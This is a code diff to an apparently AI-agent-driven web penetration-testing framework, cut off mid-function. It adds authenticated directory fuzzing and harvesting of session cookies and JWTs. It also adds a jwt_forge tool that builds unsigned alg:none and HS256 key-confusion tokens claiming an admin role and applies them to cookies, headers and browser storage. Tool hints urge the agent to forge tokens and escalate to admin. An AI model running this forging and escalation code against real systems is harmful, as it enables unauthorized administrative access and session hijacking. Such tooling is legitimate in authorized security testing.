@@ -7,6 +7,9 @@ manages target task context, and triages verified findings.
 """
 
 from dataclasses import dataclass, field
+import base64
+import hashlib
+import hmac
 import json
 import logging
 import os
@@ -260,6 +263,7 @@ def _execute_ffuf_vhost(args: Dict[str, Any], target: Target, emit: Any) -> Dict
 
 def _execute_ffuf_content(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
     """Content & directory fuzzing via ffuf."""
+    import tempfile
     url = args.get("url") or target.name
     if not url.startswith(("http://", "https://")):
         url = f"https://{url}"
@@ -279,11 +283,11 @@ def _execute_ffuf_content(args: Dict[str, Any], target: Target, emit: Any) -> Di
 
     repo_root = Path(__file__).resolve().parent.parent
     wordlist_candidates = [
+        repo_root / "wordlists" / "web" / "directories-fast.txt",
         Path("/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"),
         Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
         Path("/usr/share/wordlists/dirb/common.txt"),
-        Path("/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"),
-        repo_root / "wordlists" / "web" / "directories-fast.txt"
+        Path("/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
     ]
     wordlist = None
     for wc in wordlist_candidates:
@@ -295,37 +299,100 @@ def _execute_ffuf_content(args: Dict[str, Any], target: Target, emit: Any) -> Di
         return {"error": "No directory wordlist found."}
 
     target_url = url.rstrip("/") + "/FUZZ"
+    temp_json = None
+    try:
+        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
+            temp_json = tf.name
+    except Exception:
+        temp_json = None
+
     cmd = [
         binary,
         "-w", wordlist,
         "-u", target_url,
-        "-mc", "200,301,302,403",
-        "-of", "json",
-        "-o", "-",
+        "-mc", "200,204,301,302,307,401,403,405",
+        "-t", "40",
+        "-timeout", "5",
         "-s"
     ]
 
+    if temp_json:
+        cmd.extend(["-of", "json", "-o", temp_json])
+
+    # Pass authenticated headers/cookies if available
+    req_headers = args.get("headers") or {}
+    if not req_headers and hasattr(target, "state") and isinstance(target.state, dict):
+        req_headers = target.state.get("headers", {})
+    if isinstance(req_headers, dict):
+        for hk, hv in req_headers.items():
+            if isinstance(hv, str) and hv.strip():
+                cmd.extend(["-H", f"{hk}: {hv.strip()}"])
+
+    # Pass cookies
+    req_cookies = args.get("cookies") or {}
+    if not req_cookies and hasattr(target, "state") and isinstance(target.state, dict):
+        req_cookies = target.state.get("cookies", {})
+    if req_cookies and isinstance(req_cookies, dict):
+        cookie_str = "; ".join(f"{k}={v}" for k, v in req_cookies.items())
+        cmd.extend(["-H", f"Cookie: {cookie_str}"])
+
+    results = []
     try:
-        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-        results = []
-        if proc.stdout.strip():
-            data = json.loads(proc.stdout)
-            raw_res = data.get("results", [])
-            for r in raw_res:
-                path = r.get("input", {}).get("FUZZ", "")
-                status = r.get("status", 0)
-                length = r.get("length", 0)
-                results.append({
-                    "url": r.get("url", f"{url}/{path}"),
-                    "path": path,
-                    "status": status,
-                    "length": length
-                })
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
+        
+        # Read structured JSON output from tempfile
+        if temp_json and os.path.exists(temp_json) and os.path.getsize(temp_json) > 0:
+            with open(temp_json, "r", encoding="utf-8", errors="ignore") as f:
+                data = json.load(f)
+                raw_res = data.get("results", [])
+                for r in raw_res:
+                    path = r.get("input", {}).get("FUZZ", "")
+                    status = r.get("status", 0)
+                    length = r.get("length", 0)
+                    redirect = r.get("redirectlocation", "")
+                    hit_url = r.get("url", f"{url.rstrip('/')}/{path}")
+                    results.append({
+                        "url": hit_url,
+                        "path": path,
+                        "status": status,
+                        "length": length,
+                        "redirect": redirect
+                    })
+        elif proc.stdout.strip():
+            # Fallback: parse raw lines from stdout
+            for line in proc.stdout.strip().splitlines():
+                line_clean = line.strip()
+                if line_clean and not line_clean.startswith("[") and not line_clean.startswith("::"):
+                    results.append({
+                        "url": f"{url.rstrip('/')}/{line_clean}",
+                        "path": line_clean,
+                        "status": 200,
+                        "length": 0
+                    })
     except Exception as e:
         results = []
+    finally:
+        if temp_json and os.path.exists(temp_json):
+            try:
+                os.remove(temp_json)
+            except Exception:
+                pass
+
+    paths = [r["path"] for r in results]
+
+    # Automatically register discovered endpoints in target state
+    if hasattr(target, "state") and isinstance(target.state, dict):
+        if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
+            target.state["endpoints"] = []
+        for r in results:
+            hit_url = r.get("url")
+            if hit_url and hit_url not in target.state["endpoints"]:
+                target.state["endpoints"].append(hit_url)
+        save_target(target)
 
     return {
         "target_url": url,
+        "paths": paths,
         "discovered_endpoints": results[:100],
         "count": len(results)
     }
@@ -1164,7 +1231,7 @@ def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, 
                 allow_redirects=False
             )
 
-        # Store observed session cookies in target.state so subsequent tools (curl, gowitness) can reuse them
+        # Store observed session cookies in target.state so subsequent tools (curl, gowitness, spider) can reuse them
         raw_set_cookie = r.headers.get("set-cookie") or r.headers.get("Set-Cookie")
         if (r.cookies or raw_set_cookie) and hasattr(target, "state") and isinstance(target.state, dict):
             if "cookies" not in target.state or not isinstance(target.state["cookies"], dict):
@@ -1172,8 +1239,13 @@ def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, 
             if r.cookies:
                 target.state["cookies"].update(r.cookies.get_dict())
                 for ck, cv in r.cookies.get_dict().items():
-                    if any(x in ck.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "p_sid")):
+                    if any(x in ck.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                         target.state["session_cookie"] = f"{ck}={cv}"
+                    if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
+                        target.state["auth_token"] = cv
+                        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
+                            target.state["headers"] = {}
+                        target.state["headers"]["Authorization"] = f"Bearer {cv}"
             if raw_set_cookie:
                 for part in raw_set_cookie.split(";"):
                     if "=" in part:
@@ -1182,22 +1254,289 @@ def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, 
                         v_clean = v.strip()
                         if k_clean.lower() not in ("path", "domain", "expires", "max-age", "samesite", "httponly", "secure"):
                             target.state["cookies"][k_clean] = v_clean
-                            if any(x in k_clean.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "p_sid")):
+                            if any(x in k_clean.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                                 target.state["session_cookie"] = f"{k_clean}={v_clean}"
+                            if v_clean.startswith("eyJ") and v_clean.count(".") >= 1:
+                                target.state["auth_token"] = v_clean
+                                if "headers" not in target.state or not isinstance(target.state["headers"], dict):
+                                    target.state["headers"] = {}
+                                target.state["headers"]["Authorization"] = f"Bearer {v_clean}"
+
+        # Extract JWT / auth tokens from JSON response bodies (e.g. {"token": "...", "access_token": "..."})
+        if hasattr(target, "state") and isinstance(target.state, dict):
+            try:
+                resp_json = r.json()
+                if isinstance(resp_json, dict):
+                    for tk in ("token", "access_token", "jwt", "auth_token", "accessToken", "authToken", "id_token", "session_token"):
+                        if tk in resp_json and isinstance(resp_json[tk], str) and resp_json[tk].strip():
+                            token_val = resp_json[tk].strip()
+                            target.state["auth_token"] = token_val
+                            if "headers" not in target.state or not isinstance(target.state["headers"], dict):
+                                target.state["headers"] = {}
+                            target.state["headers"]["Authorization"] = f"Bearer {token_val}"
+                            break
+            except Exception:
+                pass
             save_target(target)
 
-        return {
+        # Inspect and decode JWT if present
+        jwt_candidate = None
+        if hasattr(target, "state") and isinstance(target.state, dict) and target.state.get("auth_token"):
+            auth_val = target.state.get("auth_token")
+            if isinstance(auth_val, str) and auth_val.startswith("eyJ") and auth_val.count(".") >= 1:
+                jwt_candidate = auth_val
+        if not jwt_candidate and r.cookies:
+            for cv in r.cookies.get_dict().values():
+                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
+                    jwt_candidate = cv
+                    break
+        if not jwt_candidate and r.text:
+            jwt_m = re.search(r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*', r.text)
+            if jwt_m:
+                jwt_candidate = jwt_m.group(0)
+
+        jwt_info = None
+        if jwt_candidate and isinstance(jwt_candidate, str) and jwt_candidate.startswith("eyJ") and jwt_candidate.count(".") >= 1:
+            try:
+                parts = jwt_candidate.split(".")
+                def _b64dec(s: str) -> Dict[str, Any]:
+                    s = s.replace("-", "+").replace("_", "/")
+                    s += "=" * ((4 - len(s) % 4) % 4)
+                    return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
+                hdr = _b64dec(parts[0]) if len(parts) > 0 else {}
+                pay = _b64dec(parts[1]) if len(parts) > 1 else {}
+                if hdr and pay:
+                    role_val = pay.get("role") or pay.get("roles") or pay.get("isAdmin") or pay.get("admin") or "user"
+                    jwt_info = {
+                        "token": jwt_candidate,
+                        "header": hdr,
+                        "payload": pay,
+                        "role": role_val,
+                        "alg": hdr.get("alg")
+                    }
+                    if str(role_val).lower() not in ("admin", "administrator", "root", "true"):
+                        jwt_info["privilege_escalation_hint"] = "Non-admin JWT detected. Use jwt_forge tool or forge alg:none with role: admin to escalate."
+            except Exception:
+                pass
+
+        # Extract detected routes, script bundles, and authorization logic from response
+        detected_scripts = set()
+        detected_routes = set()
+        detected_api_endpoints = set()
+        auth_logic_snippets = []
+
+        if r.text:
+            # 1. Detect JavaScript bundle assets (<script src="...">, /assets/*.js, etc.)
+            for m in re.findall(r'''(?:src|href)\s*=\s*[\"']([^\"' >]+\.js(?:\?[^\"' >]*)?)[\"']''', r.text, re.I):
+                clean_script = m.split("?")[0]
+                detected_scripts.add(clean_script)
+            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+\.js)['\"]''', r.text):
+                detected_scripts.add(m)
+
+            # 2. Detect general paths and links
+            for m in re.findall(r'''(?:href|action|path|url|to)\s*=\s*[\"'](/[^\"' >]+)[\"']''', r.text, re.I):
+                if not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
+                    detected_routes.add(m)
+            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+)['\"]''', r.text):
+                if len(m) > 1 and not m.startswith("//") and not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
+                    if m.endswith(".js"):
+                        detected_scripts.add(m)
+                    else:
+                        detected_routes.add(m)
+            for m in re.findall(r'''(?:window\.__BASE__\s*\|\|\s*['\"]['\"])\s*\+\s*['\"](/[^\"']+)['\"]''', r.text):
+                detected_routes.add(m)
+
+            # 3. Detect API endpoints (/api/...) and authorization logic if response is JS or large text
+            is_js_response = url.endswith(".js") or "javascript" in r.headers.get("Content-Type", "").lower()
+            for api_match in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]*api[a-zA-Z0-9_\-\.\/]*)['\"]''', r.text):
+                if len(api_match) > 4 and not any(api_match.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
+                    detected_api_endpoints.add(api_match)
+
+            if is_js_response or len(r.text) > 1000:
+                for line in re.findall(r'''[^;{}]*(?:role|owner|admin|entitlement|permission|is_admin|metadata|console|billing)[^;{}]{0,100}''', r.text, re.I):
+                    line_clean = line.strip().replace("\n", " ")
+                    if 10 < len(line_clean) < 120 and any(kw in line_clean.lower() for kw in ("role", "owner", "admin", "entitlement", "permission", "is_admin")):
+                        if line_clean not in auth_logic_snippets:
+                            auth_logic_snippets.append(line_clean)
+
+        clean_routes = []
+        for cr in sorted(list(detected_routes)):
+            if not any(cr.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".ico", ".woff", ".js")):
+                clean_routes.append(cr)
+        clean_routes = clean_routes[:35]
+
+        # Register discovered endpoints into target state
+        if hasattr(target, "state") and isinstance(target.state, dict):
+            if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
+                target.state["endpoints"] = []
+            for ep in list(clean_routes) + list(detected_api_endpoints):
+                full_url = ep if ep.startswith("http") else f"https://{target.name}{ep}"
+                if full_url not in target.state["endpoints"]:
+                    target.state["endpoints"].append(full_url)
+            save_target(target)
+
+        resp_dict: Dict[str, Any] = {
             "url": url,
             "status_code": r.status_code,
             "headers": dict(r.headers),
             "cookies": r.cookies.get_dict(),
             "body_preview": r.text[:20000]
         }
+        if jwt_info:
+            resp_dict["jwt_info"] = jwt_info
+        if detected_scripts:
+            clean_scripts = sorted(list(detected_scripts))[:10]
+            resp_dict["discovered_script_assets"] = clean_scripts
+            resp_dict["methodology_hint"] = (
+                f"CLIENT JAVASCRIPT DETECTED ({len(clean_scripts)} file(s)). "
+                f"Do NOT guess API endpoints blind. Fetch referenced JavaScript bundle(s) with curl "
+                f"to extract the exact client route table, API endpoints, and role/authorization logic."
+            )
+        if detected_api_endpoints:
+            resp_dict["discovered_api_endpoints"] = sorted(list(detected_api_endpoints))[:25]
+        if auth_logic_snippets:
+            resp_dict["authorization_logic_snippets"] = auth_logic_snippets[:15]
+        if clean_routes:
+            resp_dict["detected_routes"] = clean_routes
+        return resp_dict
     except Exception as e:
         return {
             "url": url,
             "error": str(e)
         }
+
+
+def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
+    """Decode and forge JWTs for privilege escalation and algorithm confusion."""
+    token = args.get("token")
+    if not token and hasattr(target, "state") and isinstance(target.state, dict):
+        token = target.state.get("auth_token")
+        if not token and "cookies" in target.state and isinstance(target.state["cookies"], dict):
+            for ck, cv in target.state["cookies"].items():
+                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
+                    token = cv
+                    break
+
+    if not token:
+        return {
+            "status": "error",
+            "error": "No JWT token provided or found in target session state.",
+            "hint": "Inspect target session state. If cookies are opaque (e.g. sess_..., connect.sid, PHPSESSID), the application uses server-side sessions, NOT JWTs. Look for mass assignment, nested property injection, or business logic flaws instead."
+        }
+
+    # Strict check: Reject obvious placeholder strings or opaque cookies
+    if "..." in token or token.startswith("sess_") or token.count(".") < 1:
+        return {
+            "status": "error",
+            "error": f"The provided token '{token[:30]}...' is not a valid JSON Web Token (JWT). It appears to be an opaque session identifier or placeholder. JWT attacks (alg:none, algorithm confusion) only apply to dot-separated base64url JWTs.",
+            "hint": "Do NOT attempt JWT forgery on opaque session cookies. Check application JavaScript and API endpoints for mass assignment (e.g. updating profile/account attributes via PATCH/PUT/POST) or IDOR."
+        }
+
+    def b64url_decode_json(s: str) -> Dict[str, Any]:
+        s = s.replace("-", "+").replace("_", "/")
+        s += "=" * ((4 - len(s) % 4) % 4)
+        try:
+            return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
+        except Exception:
+            return {}
+
+    def b64url_encode(obj: Any) -> str:
+        if isinstance(obj, (dict, list)):
+            raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
+        elif isinstance(obj, str):
+            raw = obj.encode("utf-8")
+        else:
+            raw = bytes(obj)
+        return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")
+
+    parts = token.strip().split(".")
+    if len(parts) < 2:
+        return {
+            "status": "error",
+            "error": "Token is not a valid JWT (must have at least 2 dot-separated segments).",
+            "hint": "Check if target uses opaque session cookies rather than JWTs."
+        }
+
+    header = b64url_decode_json(parts[0])
+    payload = b64url_decode_json(parts[1])
+
+    if not header or not payload:
+        return {
+            "status": "error",
+            "error": "Failed to decode JWT header or payload as valid JSON. The token is not a genuine JWT.",
+            "hint": "Verify the cookie/header value. If it is an opaque session ID, test access control via parameter tampering / mass assignment."
+        }
+
+    target_claims = args.get("claims") or {"role": "admin"}
+    forged_payload = dict(payload)
+    forged_payload.update(target_claims)
+
+    algo = (args.get("algorithm") or "all").lower()
+    pub_or_secret = args.get("public_key_or_secret") or ""
+
+    forged_tokens = []
+
+    # 1. alg: none variations
+    if algo in ("none", "all"):
+        for alg_val in ("none", "None", "NONE"):
+            hdr_none = dict(header)
+            hdr_none["alg"] = alg_val
+            hdr_b64 = b64url_encode(hdr_none)
+            pay_b64 = b64url_encode(forged_payload)
+            tok_none = f"{hdr_b64}.{pay_b64}."
+            forged_tokens.append({
+                "type": f"alg:{alg_val}",
+                "description": f"Unsigned JWT with alg={alg_val}",
+                "token": tok_none
+            })
+
+    # 2. RS256 -> HS256 algorithm confusion (if public key/secret provided)
+    if algo in ("hs256", "all") and pub_or_secret:
+        hdr_hs = dict(header)
+        hdr_hs["alg"] = "HS256"
+        hdr_b64 = b64url_encode(hdr_hs)
+        pay_b64 = b64url_encode(forged_payload)
+        signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
+        key_bytes = pub_or_secret.encode("utf-8")
+        sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
+        sig_b64 = b64url_encode(sig)
+        tok_hs = f"{hdr_b64}.{pay_b64}.{sig_b64}"
+        forged_tokens.append({
+            "type": "alg:HS256 (public key confusion)",
+            "description": "HMAC-SHA256 signed using public key/secret",
+            "token": tok_hs
+        })
+
+    primary_token = forged_tokens[0]["token"] if forged_tokens else token
+
+    # Auto-update target state only if original token was a JWT
+    if hasattr(target, "state") and isinstance(target.state, dict):
+        target.state["auth_token"] = primary_token
+        target.state["forged_token"] = primary_token
+        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
+            target.state["headers"] = {}
+        target.state["headers"]["Authorization"] = f"Bearer {primary_token}"
+        if "cookies" in target.state and isinstance(target.state["cookies"], dict):
+            for ck, val in list(target.state["cookies"].items()):
+                # Only replace if the original cookie value was actually the JWT
+                if val == token or (isinstance(val, str) and val.startswith("eyJ")):
+                    target.state["cookies"][ck] = primary_token
+                    target.state["session_cookie"] = f"{ck}={primary_token}"
+        save_target(target)
+
+    return {
+        "status": "success",
+        "original_header": header,
+        "original_payload": payload,
+        "forged_payload": forged_payload,
+        "primary_token": primary_token,
+        "forged_tokens": forged_tokens,
+        "instructions": (
+            "Primary forged token has been applied to target.state. "
+            "Use curl, gowitness, or spider against protected endpoints (e.g. /console, /dashboard) "
+            "with Cookie or Authorization header to verify administrative access."
+        )
+    }
 
 
 def _execute_spider(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
@@ -1209,6 +1548,22 @@ def _execute_spider(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str
 
     engine = HellhoundEngine()
     opts = {"depth": depth, "max_pages": 50, "target": url}
+
+    # Propagate session cookies / auth headers from args or target.state for authenticated crawling
+    cookie_candidate = args.get("cookies") or args.get("cookie")
+    if not cookie_candidate and hasattr(target, "state") and isinstance(target.state, dict):
+        cookie_candidate = target.state.get("session_cookie") or target.state.get("cookies")
+    if cookie_candidate:
+        opts["cookie"] = cookie_candidate
+
+    headers_candidate = args.get("headers")
+    if not headers_candidate and hasattr(target, "state") and isinstance(target.state, dict):
+        headers_candidate = target.state.get("headers")
+        if not headers_candidate and target.state.get("auth_token"):
+            headers_candidate = {"Authorization": f"Bearer {target.state.get('auth_token')}"}
+    if headers_candidate:
+        opts["headers"] = headers_candidate
+
     try:
         res = engine.run_single("spider", url, options=opts, emit=emit)
         intel = res.get("intel", {}) if isinstance(res, dict) else {}
@@ -1571,116 +1926,271 @@ def _execute_gowitness(args: Dict[str, Any], target: Target, emit: Any) -> Dict[
 
     # Resolve headers and session cookies for authenticated screenshots
     custom_headers = dict(args.get("headers") or {})
-    cookies = args.get("cookies") or args.get("cookie")
-    if cookies:
-        if isinstance(cookies, dict):
-            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
-        else:
-            cookie_str = str(cookies).strip()
-        if cookie_str and not any(k.lower() == "cookie" for k in custom_headers.keys()):
-            custom_headers["Cookie"] = cookie_str
+    cookies_input = args.get("cookies") or args.get("cookie")
+    cookies_dict: Dict[str, str] = {}
 
-    # Auto-attach saved session cookies if none explicitly provided
-    if not any(k.lower() == "cookie" for k in custom_headers.keys()) and hasattr(target, "state") and isinstance(target.state, dict):
+    if cookies_input:
+        if isinstance(cookies_input, dict):
+            cookies_dict.update({str(k): str(v) for k, v in cookies_input.items()})
+        else:
+            for pair in str(cookies_input).split(";"):
+                if "=" in pair:
+                    k, v = pair.strip().split("=", 1)
+                    cookies_dict[k.strip()] = v.strip()
+
+    # Auto-attach saved session cookies and headers from target.state
+    if hasattr(target, "state") and isinstance(target.state, dict):
+        saved_cookies = target.state.get("cookies")
+        if saved_cookies and isinstance(saved_cookies, dict):
+            for k, v in saved_cookies.items():
+                cookies_dict.setdefault(str(k), str(v))
         saved_cookie = target.state.get("session_cookie")
-        saved_cookies_dict = target.state.get("cookies")
-        if saved_cookie:
-            custom_headers["Cookie"] = str(saved_cookie)
-        elif saved_cookies_dict and isinstance(saved_cookies_dict, dict):
-            custom_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in saved_cookies_dict.items())
+        if saved_cookie and "=" in str(saved_cookie):
+            for pair in str(saved_cookie).split(";"):
+                if "=" in pair:
+                    k, v = pair.strip().split("=", 1)
+                    cookies_dict.setdefault(k.strip(), v.strip())
+        saved_headers = target.state.get("headers")
+        if saved_headers and isinstance(saved_headers, dict):
+            for k, v in saved_headers.items():
+                custom_headers.setdefault(k, str(v))
+        saved_token = target.state.get("auth_token") or target.state.get("forged_token")
+        if saved_token and "Authorization" not in custom_headers:
+            custom_headers["Authorization"] = f"Bearer {saved_token}"
+
+    # Build cookie header if cookies present
+    if cookies_dict:
+        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
+        if not any(k.lower() == "cookie" for k in custom_headers):
+            custom_headers["Cookie"] = cookie_header
 
     merged_headers = merge_global_context({"global_headers": custom_headers})
 
     chrome_bin = _find_binary("chromium") or _find_binary("google-chrome") or _find_binary("chrome")
+    chromedriver_bin = _find_binary("chromedriver")
 
     captured_items: List[Dict[str, Any]] = []
 
-    import tempfile
-    with tempfile.TemporaryDirectory() as tmp_dir:
-        jsonl_path = Path(tmp_dir) / "gowitness_results.jsonl"
-        cookie_header = merged_headers.get("Cookie")
+    # Attempt 1: High-fidelity Selenium + CDP pre-navigation cookie/header injection
+    selenium_success = False
+    try:
+        from selenium import webdriver
+        from selenium.webdriver.chrome.service import Service
+        from selenium.webdriver.chrome.options import Options
+        from urllib.parse import urlparse
 
-        if len(target_urls) == 1:
-            target_url = target_urls[0]
-            cmd = [
-                binary, "scan", "single",
-                "-u", target_url,
-                "-s", str(screenshots_dir),
-                "--screenshot-format", "png",
-                "--delay", str(delay),
-                "--write-jsonl",
-                "--write-jsonl-file", str(jsonl_path),
-            ]
-            if fullpage:
-                cmd.append("--screenshot-fullpage")
-            if chrome_bin:
-                cmd.extend(["--chrome-path", chrome_bin])
-            for h_k, h_v in merged_headers.items():
-                cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
-            if cookie_header:
-                clean_cookie = cookie_header.replace("'", "\\'")
-                cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])
+        if chrome_bin and chromedriver_bin:
+            opts = Options()
+            opts.binary_location = chrome_bin
+            opts.add_argument("--headless=new")
+            opts.add_argument("--no-sandbox")
+            opts.add_argument("--disable-dev-shm-usage")
+            opts.add_argument("--disable-gpu")
+            opts.add_argument("--window-size=1440,900")
+            opts.add_argument("--ignore-certificate-errors")
 
+            service = Service(executable_path=chromedriver_bin)
+            driver = webdriver.Chrome(service=service, options=opts)
             try:
-                subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-            except Exception as e:
-                return {"error": f"gowitness execution failed: {e}", "url": target_url}
-        else:
-            targets_file = Path(tmp_dir) / "targets.txt"
-            targets_file.write_text("\n".join(target_urls) + "\n")
-            cmd = [
-                binary, "scan", "file",
-                "-f", str(targets_file),
-                "-s", str(screenshots_dir),
-                "--screenshot-format", "png",
-                "--delay", str(delay),
-                "--write-jsonl",
-                "--write-jsonl-file", str(jsonl_path),
-            ]
-            if fullpage:
-                cmd.append("--screenshot-fullpage")
-            if chrome_bin:
-                cmd.extend(["--chrome-path", chrome_bin])
-            for h_k, h_v in merged_headers.items():
-                cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
-            if cookie_header:
-                clean_cookie = cookie_header.replace("'", "\\'")
-                cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])
+                for target_url in target_urls:
+                    parsed_u = urlparse(target_url)
+                    host = parsed_u.hostname or ""
 
-            try:
-                subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            except Exception as e:
-                return {"error": f"gowitness batch execution failed: {e}", "urls": target_urls}
+                    driver.execute_cdp_cmd("Network.enable", {})
 
-        if jsonl_path.exists():
-            for line in jsonl_path.read_text().splitlines():
-                if not line.strip():
-                    continue
-                try:
-                    data = json.loads(line)
-                    fname = data.get("file_name", "")
-                    screenshot_file = str(screenshots_dir / fname) if fname else ""
-                    if not (screenshot_file and os.path.exists(screenshot_file)):
-                        for f in screenshots_dir.glob("*.png"):
-                            if fname and str(f).endswith(fname):
-                                screenshot_file = str(f)
-                                break
+                    non_cookie_headers = {k: v for k, v in merged_headers.items() if k.lower() != "cookie"}
+                    if non_cookie_headers:
+                        driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {"headers": non_cookie_headers})
+
+                    if cookies_dict and host:
+                        for c_k, c_v in cookies_dict.items():
+                            try:
+                                driver.execute_cdp_cmd("Network.setCookie", {
+                                    "name": c_k,
+                                    "value": c_v,
+                                    "domain": host,
+                                    "path": "/",
+                                    "secure": target_url.startswith("https"),
+                                    "httpOnly": False
+                                })
+                            except Exception:
+                                pass
+
+                    driver.get(target_url)
+
+                    # Inject token into localStorage / sessionStorage for SPAs
+                    auth_tok = target.state.get("auth_token") or target.state.get("forged_token") if hasattr(target, "state") and isinstance(target.state, dict) else None
+                    if auth_tok:
+                        try:
+                            driver.execute_script('''
+                                try {
+                                    localStorage.setItem('token', arguments[0]);
+                                    localStorage.setItem('auth_token', arguments[0]);
+                                    localStorage.setItem('jwt', arguments[0]);
+                                    sessionStorage.setItem('token', arguments[0]);
+                                } catch(e) {}
+                            ''', auth_tok)
+                        except Exception:
+                            pass
+
+                    import time
+                    time.sleep(max(1, delay))
+
+                    safe_slug = re.sub(r'[^a-zA-Z0-9_\-\.]', '-', target_url).strip('-')
+                    if not safe_slug:
+                        safe_slug = "screenshot"
+                    out_file = screenshots_dir / f"{safe_slug}.png"
+
+                    if fullpage:
+                        try:
+                            total_height = driver.execute_script("return Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, 900);")
+                            driver.set_window_size(1440, min(int(total_height), 8000))
+                            time.sleep(0.3)
+                        except Exception:
+                            pass
+
+                    driver.save_screenshot(str(out_file))
+
+                    page_text = ""
+                    try:
+                        page_text = driver.find_element("tag name", "body").text or ""
+                    except Exception:
+                        page_text = driver.page_source or ""
+
+                    lower_text = page_text.lower()
+                    lower_title = (driver.title or "").lower()
+
+                    access_denied_signals = []
+                    for phrase in [
+                        "403", "401", "owner access required", "access denied",
+                        "restricted to workspace owners", "restricted to owners",
+                        "restricted to administrators", "admin access required",
+                        "unauthorized", "permission denied", "forbidden",
+                        "sign in to continue", "log in to your account"
+                    ]:
+                        if phrase in lower_title or phrase in lower_text:
+                            access_denied_signals.append(phrase)
+
+                    access_verdict = "DENIED / RESTRICTED" if access_denied_signals else "SUCCESS / ACCESSIBLE"
 
                     item_info = {
-                        "url": data.get("url", ""),
-                        "final_url": data.get("final_url", ""),
-                        "title": data.get("title", ""),
-                        "response_code": data.get("response_code", 0),
-                        "file_path": screenshot_file,
-                        "file_name": fname,
+                        "url": target_url,
+                        "final_url": driver.current_url or target_url,
+                        "title": driver.title or target_url,
+                        "response_code": 200,
+                        "access_verdict": access_verdict,
+                        "access_denied_signals": list(set(access_denied_signals)),
+                        "file_path": str(out_file),
+                        "file_name": out_file.name,
+                        "file_size": out_file.stat().st_size if out_file.exists() else 0,
                         "timestamp": datetime.now(timezone.utc).isoformat(),
-                        "technologies": [t.get("value") for t in data.get("technologies", []) if isinstance(t, dict) and t.get("value")],
+                        "technologies": [],
                     }
-                    if screenshot_file and os.path.exists(screenshot_file):
-                        item_info["file_size"] = os.path.getsize(screenshot_file)
+                    if access_denied_signals:
+                        item_info["warning"] = f"PAGE INDICATES ACCESS RESTRICTION: Found '{', '.join(set(access_denied_signals))}'. This endpoint is NOT fully unlocked."
                     captured_items.append(item_info)
+                selenium_success = True
+            finally:
+                try:
+                    driver.quit()
                 except Exception:
-                    continue
+                    pass
+    except Exception:
+        selenium_success = False
+
+    # Attempt 2: Fallback to gowitness binary if Selenium was not available or failed
+    if not selenium_success:
+        auto_install = bool(load_config().get("auto_install_missing_tools", False))
+        check = ensure_tool("gowitness", emit=emit, auto_install=auto_install)
+        binary = get_binary_path("gowitness") or "gowitness"
+
+        if check["available"]:
+            import tempfile
+            with tempfile.TemporaryDirectory() as tmp_dir:
+                jsonl_path = Path(tmp_dir) / "gowitness_results.jsonl"
+                cookie_header = merged_headers.get("Cookie")
+
+                if len(target_urls) == 1:
+                    target_url = target_urls[0]
+                    cmd = [
+                        binary, "scan", "single",
+                        "-u", target_url,
+                        "-s", str(screenshots_dir),
+                        "--screenshot-format", "png",
+                        "--delay", str(delay),
+                        "--write-jsonl",
+                        "--write-jsonl-file", str(jsonl_path),
+                    ]
+                    if fullpage:
+                        cmd.append("--screenshot-fullpage")
+                    if chrome_bin:
+                        cmd.extend(["--chrome-path", chrome_bin])
+                    for h_k, h_v in merged_headers.items():
+                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
+                    if cookie_header:
+                        clean_cookie = cookie_header.replace("'", "\\'")
